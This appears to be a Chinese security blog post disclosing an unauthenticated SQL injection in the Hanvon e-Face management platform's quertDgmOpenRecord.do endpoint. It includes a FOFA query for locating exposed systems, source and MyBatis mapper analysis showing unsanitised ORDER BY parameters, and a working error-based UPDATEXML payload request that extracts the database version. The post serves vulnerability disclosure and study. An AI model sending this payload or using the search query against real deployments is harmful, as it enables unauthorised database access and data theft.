---
title: "汉王e脸通综合管理平台 quertDgmOpenRecord.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-quertDgmOpenRecord-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-quertdgmopenrecord.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 quertDgmOpenRecord.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/30 12:29
- 877浏览
- [0评论](#comment)
- 40分钟阅读

深入探索

传输层安全性协议

技术文章订阅

网络安全课程

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `quertDgmOpenRecord.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `DgmOpenRecordController` 里关于 `quertDgmOpenRecord` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/quertDgmOpenRecord.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson quertDgmOpenRecord(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "openType") String openType, @RequestParam(required = false,value = "userName") String userName, @RequestParam(required = false,value = "deviceName") String deviceName, @RequestParam(required = false,value = "start") String start, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            DgmOpenRecordParam param = new DgmOpenRecordParam();
            param.setOpenType(openType);
            param.setUserName(userName);
            param.setDeviceName(deviceName);
            if (start != null || end != null) {
                param.setStart(DateUtils.formatStrToDate(start));
                param.setEnd(DateUtils.formatStrToDate(end));
            }

            param.setColumnKey(columnKey);
            param.setOrder(order);
            PageHelper.startPage(page, pageSize);
            List<DgmOpenRecord> list = this.dgmOpenRecordAsm.quertDgmOpenRecord(param);
```

深入探索

在线安全工具

Web安全书籍

文件大小转换

跟进`quertDgmOpenRecord`方法

```
List<DgmOpenRecord> quertDgmOpenRecord(@Param("param") DgmOpenRecordParam var1);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 DgmOpenRecordDsm.xml

代码安全审计

```
<select id="quertDgmOpenRecord" parameterType="com.hanvon.iface.tpm.telPo.param.DgmOpenRecordParam" resultMap="BaseResultMap">
    SELECT DOR.ID, DOR.OPEN_TYPE, DOR.USER_ID, DOR.USER_NAME, DOR.USER_DEPARTMENT_NAME, DOR.USER_IDCARD, DOR.USER_TYPE,
    DOR.DEVICE_SN, DOR.DEVICE_NAME, DOR.DEVICE_ADDRESS, DOR.CARD_SN, DOR.CAPTURE_PHOTO, DOR.OPENTIME, DOR.MEMO, DOR.DEVICE_NUMBER,
    CALL_TIME
    FROM DGM_OPEN_RECORD DOR
    WHERE 1 = 1
    <if test="param.start != null and param.end != null">
      AND DOR.OPENTIME BETWEEN #{param.start} AND #{param.end}
    </if>
    <if test="param.userName != null">
      AND DOR.USER_NAME like CONCAT('%',#{param.userName},'%')
    </if>
    <if test="param.deviceName != null">
      AND DOR.DEVICE_NAME like CONCAT('%',#{param.deviceName},'%')
    </if>
    <if test="param.openType != null">
      AND DOR.OPEN_TYPE = #{param.openType}
    </if>
    <if test="param.userId != null">
      AND DOR.USER_ID = #{param.userId}
    </if>
    ORDER BY
    <if test="param.order == null or param.order == ''">
      DOR.OPENTIME desc
    </if>
    <if test="param.order != null and param.order != ''">
      ${param.columnKey} ${param.order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/dgmOpenRecord/quertDgmOpenRecord.do?branchId=1&columnKey=&deviceName=test&id=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-03-25&end=2025-03-25 HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 quertDgmOpenRecord.do SQL注入漏洞](images/img-001-dd145d93974b.webp)](https://image.mrxn.net/74e150cb841b4284a109feaaf2ff20f0.webp)

成功利用报错注入获取到数据库版本号信息

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
